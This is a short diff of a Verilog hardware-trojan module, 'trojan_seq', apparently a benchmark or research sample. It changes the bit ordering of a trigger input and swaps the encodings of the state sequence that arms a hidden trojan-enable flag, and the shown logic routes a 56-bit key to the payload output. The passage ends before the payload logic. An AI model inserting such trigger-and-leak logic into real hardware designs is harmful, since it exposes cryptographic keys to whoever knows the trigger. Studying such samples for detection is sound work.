@@ -15,13 +15,13 @@ module  trojan_seq (
 input					clk,
 input					rst,
 input		[55:0]	    key,
-input		[31:0]	    trigger,
+input		[1:32]	    trigger,
 output reg	[55:0]	    payload
 );
 
 //	trigger condition definition (order of states)
-parameter 	STATE0  = 2'b10, 
-			STATE1	= 2'b01, 
+parameter 	STATE0  = 2'b01, 
+			STATE1	= 2'b10, 
 			STATE2 	= 2'b11;
 
 reg [5:0]	state_order;
@@ -36,7 +36,7 @@ always @(negedge clk) begin
 		trojan_en 	<= #1 1'b0;
 		payload 	<= #1 key;
 	end else begin
-		state_order	<= #1 {state_order[3:0], trigger[1:0]};
+		state_order	<= #1 {state_order[3:0], trigger[1:2]};
 		trojan_en 	<= #1 trojan_en_next;
 
 		if (trojan_en) begin
